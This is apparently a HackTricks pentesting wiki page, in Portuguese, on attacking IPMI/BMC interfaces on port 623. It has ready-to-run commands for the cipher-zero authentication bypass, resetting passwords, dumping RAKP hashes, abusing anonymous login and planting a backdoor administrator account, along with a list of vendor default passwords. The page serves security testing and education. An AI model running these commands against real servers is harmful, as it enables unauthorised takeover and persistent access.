# 623/UDP/TCP - IPMI

## 623/UDP/TCP - IPMI

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

### **Overview of IPMI**

**[Intelligent Platform Management Interface (IPMI)](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)** oferece uma abordagem padronizada para gerenciamento e monitoramento remoto de sistemas computacionais, independente do sistema operacional ou estado de energia. Esta tecnologia permite que administradores de sistema gerenciem sistemas remotamente, mesmo quando est√£o desligados ou n√£o respondem, e √© especialmente √∫til para:

- Configura√ß√µes de pr√©-inicializa√ß√£o do sistema operacional
- Gerenciamento de desligamento
- Recupera√ß√£o de falhas do sistema

O IPMI √© capaz de monitorar temperaturas, voltagens, velocidades de ventiladores e fontes de alimenta√ß√£o, al√©m de fornecer informa√ß√µes de invent√°rio, revisar logs de hardware e enviar alertas via SNMP. Essencial para seu funcionamento s√£o uma fonte de energia e uma conex√£o LAN.

Desde sua introdu√ß√£o pela Intel em 1998, o IPMI tem sido suportado por diversos fornecedores, aprimorando as capacidades de gerenciamento remoto, especialmente com o suporte da vers√£o 2.0 para serial over LAN. Os componentes principais incluem:

- **Baseboard Management Controller (BMC):** O microcontrolador principal para opera√ß√µes de IPMI.
- **Buses e Interfaces de Comunica√ß√£o:** Para comunica√ß√£o interna e externa, incluindo ICMB, IPMB e v√°rias interfaces para conex√µes locais e de rede.
- **Mem√≥ria IPMI:** Para armazenar logs e dados.

![https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**Porta Padr√£o**: 623/UDP/TCP (Normalmente est√° no UDP, mas tamb√©m pode estar rodando no TCP)

## Enumeration

### Discovery
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
Voc√™ pode **identificar** a **vers√£o** usando:
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### Vulnerabilidades do IPMI

No √¢mbito do IPMI 2.0, uma falha de seguran√ßa significativa foi descoberta por Dan Farmer, expondo uma vulnerabilidade atrav√©s do **tipo de cifra 0**. Esta vulnerabilidade, documentada em detalhes na [pesquisa de Dan Farmer](http://fish2.com/ipmi/cipherzero.html), permite acesso n√£o autorizado com qualquer senha, desde que um usu√°rio v√°lido seja alvo. Essa fraqueza foi encontrada em v√°rios BMCs de fabricantes como HP, Dell e Supermicro, sugerindo um problema generalizado em todas as implementa√ß√µes do IPMI 2.0.

### **Bypass de Autentica√ß√£o do IPMI via Cifra 0**

Para detectar essa falha, o seguinte scanner auxiliar do Metasploit pode ser empregado:
```bash
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
A explora√ß√£o dessa falha √© alcan√ß√°vel com `ipmitool`, conforme demonstrado abaixo, permitindo a listagem e modifica√ß√£o de senhas de usu√°rios:
```bash
apt-get install ipmitool # Installation command
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list # Lists users
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 # Changes password
```
### **Recupera√ß√£o de Hash de Senha Remota de Autentica√ß√£o RAKP do IPMI 2.0**

Essa vulnerabilidade permite a recupera√ß√£o de senhas hash salgadas (MD5 e SHA1) para qualquer nome de usu√°rio existente. Para testar essa vulnerabilidade, o Metasploit oferece um m√≥dulo:
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
### **Autentica√ß√£o An√¥nima IPMI**

Uma configura√ß√£o padr√£o em muitos BMCs permite acesso "an√¥nimo", caracterizado por strings de nome de usu√°rio e senha nulas. Essa configura√ß√£o pode ser explorada para redefinir senhas de contas de usu√°rio nomeadas usando `ipmitool`:
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword
```
### **Supermicro IPMI Senhas em Texto Claro**

Uma escolha de design cr√≠tica no IPMI 2.0 exige o armazenamento de senhas em texto claro dentro dos BMCs para fins de autentica√ß√£o. O armazenamento dessas senhas pela Supermicro em locais como `/nv/PSBlock` ou `/nv/PSStore` levanta preocupa√ß√µes significativas de seguran√ßa:
```bash
cat /nv/PSBlock
```
### **Vulnerabilidade UPnP do IPMI da Supermicro**

A inclus√£o de um ouvinte SSDP UPnP no firmware IPMI da Supermicro, particularmente na porta UDP 1900, introduz um grave risco de seguran√ßa. Vulnerabilidades no Intel SDK para Dispositivos UPnP vers√£o 1.3.1, conforme detalhado pela [divulga√ß√£o da Rapid7](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play), permitem acesso root ao BMC:
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### Brute Force

**A HP randomiza a senha padr√£o** para seu produto **Integrated Lights Out (iLO)** durante a fabrica√ß√£o. Essa pr√°tica contrasta com outros fabricantes, que tendem a usar **credenciais padr√£o est√°ticas**. Um resumo de nomes de usu√°rios e senhas padr√£o para v√°rios produtos √© fornecido a seguir:

- **HP Integrated Lights Out (iLO)** usa uma **string aleat√≥ria de 8 caracteres** como sua senha padr√£o, demonstrando um n√≠vel de seguran√ßa mais alto.
- Produtos como **iDRAC da Dell, IMM da IBM** e **Controlador de Gerenciamento Remoto Integrado da Fujitsu** usam senhas facilmente adivinh√°veis, como "calvin", "PASSW0RD" (com um zero) e "admin", respectivamente.
- Da mesma forma, **Supermicro IPMI (2.0), Oracle/Sun ILOM** e **ASUS iKVM BMC** tamb√©m usam credenciais padr√£o simples, com "ADMIN", "changeme" e "admin" servindo como suas senhas.

## Accessing the Host via BMC

O acesso administrativo ao Controlador de Gerenciamento de Placa Base (BMC) abre v√°rios caminhos para acessar o sistema operacional do host. Uma abordagem simples envolve explorar a funcionalidade de Teclado, V√≠deo e Mouse (KVM) do BMC. Isso pode ser feito reiniciando o host para um shell root via GRUB (usando `init=/bin/sh`) ou inicializando a partir de um CD-ROM virtual configurado como disco de resgate. Esses m√©todos permitem a manipula√ß√£o direta do disco do host, incluindo a inser√ß√£o de backdoors, extra√ß√£o de dados ou quaisquer a√ß√µes necess√°rias para uma avalia√ß√£o de seguran√ßa. No entanto, isso requer a reinicializa√ß√£o do host, o que √© uma desvantagem significativa. Sem reiniciar, acessar o host em execu√ß√£o √© mais complexo e varia com a configura√ß√£o do host. Se o console f√≠sico ou serial do host permanecer logado, pode ser facilmente assumido atrav√©s das funcionalidades KVM ou serial-over-LAN (sol) do BMC via `ipmitool`. Explorar a explora√ß√£o de recursos de hardware compartilhados, como o barramento i2c e o chip Super I/O, √© uma √°rea que demanda mais investiga√ß√£o.

## Introducing Backdoors into BMC from the Host

Ao comprometer um host equipado com um BMC, a **interface BMC local pode ser aproveitada para inserir uma conta de usu√°rio backdoor**, criando uma presen√ßa duradoura no servidor. Este ataque requer a presen√ßa de **`ipmitool`** no host comprometido e a ativa√ß√£o do suporte ao driver BMC. Os seguintes comandos ilustram como uma nova conta de usu√°rio pode ser injetada no BMC usando a interface local do host, o que contorna a necessidade de autentica√ß√£o. Essa t√©cnica √© aplic√°vel a uma ampla gama de sistemas operacionais, incluindo Linux, Windows, BSD e at√© mesmo DOS.
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `port:623`

## Refer√™ncias

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
